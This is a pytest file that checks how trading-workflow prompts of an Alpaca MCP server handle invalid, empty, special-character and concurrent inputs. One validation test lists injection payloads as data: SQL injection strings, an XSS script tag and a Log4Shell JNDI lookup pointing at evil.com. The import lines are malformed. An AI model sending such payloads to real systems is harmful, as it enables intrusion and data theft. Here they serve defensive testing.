"""
Error handling and fallback scenario tests.
Tests workflows with invalid inputs, network issues, and edge cases.
"""

import asyncio
import sys
from pathlib import Path

import pytest

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from alpaca_mcp_server  # noqa: E402.prompts.day_trading_workflow import day_trading_workflow
from alpaca_mcp_server  # noqa: E402.prompts.market_session_workflow import market_session_workflow
from alpaca_mcp_server  # noqa: E402.prompts.master_scanning_workflow import master_scanning_workflow
from alpaca_mcp_server  # noqa: E402.prompts.pro_technical_workflow import pro_technical_workflow


class TestErrorHandling:
    """Test error handling across all workflows."""

    @pytest.mark.asyncio
    async def test_invalid_scan_type(self):
        """Test master scanner with invalid scan type."""
        result = await master_scanning_workflow("invalid_scan_type")

        assert isinstance(result, str)
        assert len(result) > 0
        # Should handle gracefully, not crash
        print(f"✅ Invalid scan type handled: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_invalid_symbol(self):
        """Test technical workflow with invalid symbol."""
        result = await pro_technical_workflow("INVALIDXYZ123", "quick")

        assert isinstance(result, str)
        assert len(result) > 0
        # Should return error message or fallback
        print(f"✅ Invalid symbol handled: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_invalid_timeframe(self):
        """Test technical workflow with invalid timeframe."""
        result = await pro_technical_workflow("AAPL", "invalid_timeframe")

        assert isinstance(result, str)
        assert len(result) > 0
        print(f"✅ Invalid timeframe handled: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_invalid_session_type(self):
        """Test session workflow with invalid session type."""
        result = await market_session_workflow("invalid_session")

        assert isinstance(result, str)
        assert len(result) > 0
        print(f"✅ Invalid session type handled: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_empty_parameters(self):
        """Test workflows with empty parameters."""
        # Test empty string parameters
        results = []

        results.append(await master_scanning_workflow(""))
        results.append(await pro_technical_workflow("", ""))
        results.append(await market_session_workflow(""))
        results.append(await day_trading_workflow(""))

        for i, result in enumerate(results):
            assert isinstance(result, str)
            assert len(result) > 0
            print(f"✅ Empty parameter test {i+1}: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_none_parameters(self):
        """Test workflows with None parameters."""
        # Test None parameters where possible
        result = await day_trading_workflow(None)

        assert isinstance(result, str)
        assert len(result) > 0
        print(f"✅ None parameter handled: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_special_characters(self):
        """Test workflows with special characters in inputs."""
        special_inputs = [
            "AAPL$%^&*",
            "!@#$%^&*()",
            "测试",  # Chinese characters
            "символ",  # Cyrillic
            "🚀📈💰",  # Emojis
        ]

        for special_input in special_inputs:
            result = await pro_technical_workflow(special_input, "quick")
            assert isinstance(result, str)
            assert len(result) > 0
            print(f"✅ Special chars '{special_input[:5]}...': {len(result)} chars")


class TestFallbackScenarios:
    """Test fallback scenarios when APIs are unavailable."""

    @pytest.mark.asyncio
    async def test_scanner_fallback(self):
        """Test scanner fallback when tools fail."""
        # Test scanner workflow - should have fallback messages
        result = await master_scanning_workflow("comprehensive")

        assert isinstance(result, str)
        assert len(result) > 500
        # Should contain either real data or fallback messages
        assert "SCANNER" in result or "scanner" in result.lower()
        print(f"✅ Scanner fallback: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_technical_analysis_fallback(self):
        """Test technical analysis fallback scenarios."""
        # Test with low-volume symbol that might not have data
        result = await pro_technical_workflow("AAPL", "comprehensive")

        assert isinstance(result, str)
        assert len(result) > 800
        assert "AAPL" in result or "TECHNICAL" in result
        print(f"✅ Technical analysis fallback: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_session_strategy_fallback(self):
        """Test session strategy fallback scenarios."""
        result = await market_session_workflow("full_day")

        assert isinstance(result, str)
        assert len(result) > 1000
        assert "SESSION" in result or "session" in result.lower()
        print(f"✅ Session strategy fallback: {len(result)} chars")


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    @pytest.mark.asyncio
    async def test_very_long_symbol(self):
        """Test with very long symbol names."""
        long_symbol = "A" * 100  # 100 character symbol
        result = await pro_technical_workflow(long_symbol, "quick")

        assert isinstance(result, str)
        assert len(result) > 0
        print(f"✅ Long symbol handled: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_concurrent_workflow_execution(self):
        """Test multiple workflows running concurrently."""
        tasks = [
            master_scanning_workflow("quick"),
            pro_technical_workflow("AAPL", "quick"),
            market_session_workflow("market_open"),
            day_trading_workflow("SPY"),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for i, result in enumerate(results):
            if isinstance(result, Exception):
                print(f"⚠️  Task {i} failed: {result}")
            else:
                assert isinstance(result, str)
                assert len(result) > 0
                print(f"✅ Concurrent task {i}: {len(result)} chars")

    @pytest.mark.asyncio
    async def test_rapid_sequential_calls(self):
        """Test rapid sequential workflow calls."""
        symbols = ["AAPL", "MSFT", "GOOGL", "TSLA", "NVDA"]

        start_time = asyncio.get_event_loop().time()

        for symbol in symbols:
            result = await pro_technical_workflow(symbol, "quick")
            assert isinstance(result, str)
            assert symbol in result

        end_time = asyncio.get_event_loop().time()
        total_time = end_time - start_time

        print(f"✅ Rapid sequential calls: {len(symbols)} symbols in {total_time:.2f}s")
        assert total_time < 60.0  # Should complete within reasonable time

    @pytest.mark.asyncio
    async def test_memory_usage_with_large_outputs(self):
        """Test memory handling with large workflow outputs."""
        # Run comprehensive workflows that generate large outputs
        large_workflows = [
            master_scanning_workflow("comprehensive"),
            pro_technical_workflow("AAPL", "comprehensive"),
            market_session_workflow("full_day"),
        ]

        total_chars = 0
        for workflow in large_workflows:
            result = await workflow
            total_chars += len(result)
            assert isinstance(result, str)

        print(f"✅ Large outputs handled: {total_chars:,} total characters")
        assert total_chars > 5000  # Should generate substantial output


class TestDataValidation:
    """Test data validation and sanitization."""

    @pytest.mark.asyncio
    async def test_sql_injection_like_inputs(self):
        """Test SQL injection-like inputs are handled safely."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "UNION SELECT * FROM secrets",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]

        for malicious_input in malicious_inputs:
            result = await pro_technical_workflow(malicious_input, "quick")
            assert isinstance(result, str)
            assert len(result) > 0
            # Should not contain the malicious input verbatim in error cases
            print("✅ Malicious input handled safely")

    @pytest.mark.asyncio
    async def test_unicode_and_encoding(self):
        """Test unicode and encoding edge cases."""
        unicode_inputs = [
            "AAPL\x00",  # Null byte
            "AAPL\uffff",  # Unicode replacement character
            "AAPL\u202e",  # Right-to-left override
            "AAPL\n\r\t",  # Control characters
        ]

        for unicode_input in unicode_inputs:
            result = await pro_technical_workflow(unicode_input, "quick")
            assert isinstance(result, str)
            assert len(result) > 0
            print("✅ Unicode input handled")


class TestRecoveryMechanisms:
    """Test recovery mechanisms when components fail."""

    @pytest.mark.asyncio
    async def test_partial_failure_recovery(self):
        """Test workflows recover from partial component failures."""
        # Test workflows that might have some components fail
        # but still provide useful output

        workflows = [
            ("master_scan", master_scanning_workflow("comprehensive")),
            ("technical", pro_technical_workflow("AAPL", "comprehensive")),
            ("session", market_session_workflow("full_day")),
        ]

        for name, workflow_coro in workflows:
            result = await workflow_coro
            assert isinstance(result, str)
            assert len(result) > 100

            # Should contain either success indicators or fallback messages
            has_success = any(
                indicator in result
                for indicator in ["✅", "SUCCESS", "OPERATIONAL", "Results:", "Analysis:"]
            )
            has_fallback = any(
                fallback in result
                for fallback in ["Ready", "test mode", "fallback", "error", "unavailable"]
            )

            assert (
                has_success or has_fallback
            ), f"{name} workflow shows no success or fallback indicators"
            print(f"✅ {name} recovery: {'success' if has_success else 'fallback'}")


if __name__ == "__main__":
    # Run error handling tests directly
    pytest.main([__file__, "-v", "-s"])
